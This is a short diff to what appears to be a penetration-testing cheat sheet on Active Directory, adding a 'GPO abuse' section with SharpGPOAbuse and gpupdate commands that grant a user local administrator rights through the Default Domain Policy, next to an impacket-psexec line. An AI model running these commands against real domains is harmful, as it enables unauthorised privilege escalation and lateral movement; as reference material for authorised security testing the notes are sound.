@@ -170,4 +170,8 @@ impacket-psexec -no-pass -k <FQDN(computername.domain.name)>
 ```
 ---
 # GPO abuse
+```powershell
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+gpupdate /force
+```
 - https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7
